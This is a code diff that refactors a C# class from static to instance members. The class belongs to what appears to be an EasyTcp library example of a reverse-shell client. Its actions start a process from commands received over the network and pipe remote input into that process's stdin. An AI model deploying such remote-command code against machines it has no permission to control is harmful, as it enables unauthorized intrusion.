@@ -9,19 +9,19 @@ namespace EasyTcp3.Examples.ReverseShell.Client.Actions
     /// <summary>
     /// Actions that add support for a remote shell 
     /// </summary>
-    public static class ShellActions
+    public class ShellActions
     {
         /// <summary>
         /// Running process
         /// </summary>
-        private static Process _process;
+        private Process _process;
 
         /// <summary>
         /// Start a new process,
         /// old process gets disposed 
         /// </summary>
         [EasyTcpAction("execute")]
-        public static void Execute(object s, Message e)
+        public void Execute(object s, Message e)
         {
             _process?.Dispose(); // Dispose old process if possible
             _process = CreateProcess(e);
@@ -32,14 +32,14 @@ namespace EasyTcp3.Examples.ReverseShell.Client.Actions
         /// Pipe string into stdin of process 
         /// </summary>
         [EasyTcpAction(">")]
-        public static void PipeIntoProcess(object s, Message e)
+        public void PipeIntoProcess(object s, Message e)
             => _process?.StandardInput.WriteLine(e.Decompress().ToString().Replace(':',' '));
 
         /// <summary>
         /// Create a new process
         /// </summary>
         /// <returns>new created process</returns>
-        private static Process CreateProcess(Message e)
+        private Process CreateProcess(Message e)
         {
             var args = e.Decompress().ToString().Split(':');
 
